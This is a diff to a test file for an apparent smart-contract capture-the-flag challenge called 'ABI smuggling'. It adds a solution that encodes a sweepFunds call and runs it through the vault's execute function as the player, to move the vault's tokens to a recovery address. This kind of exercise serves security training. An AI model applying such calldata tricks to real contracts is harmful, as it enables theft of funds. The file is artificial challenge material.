@@ -45,6 +45,14 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        
+        let methodId = ethers.utils.id("sweepFunds(address,address)").slice(0, 10);
+                
+        let calldata = ethers.utils.hexConcat([
+            methodId, 
+            ethers.utils.defaultAbiCoder.encode(["address", "address"], [recovery.address, token.address])
+        ]);
+        await vault.connect(player).execute(vault.address, calldata);
     });
 
     after(async function () {
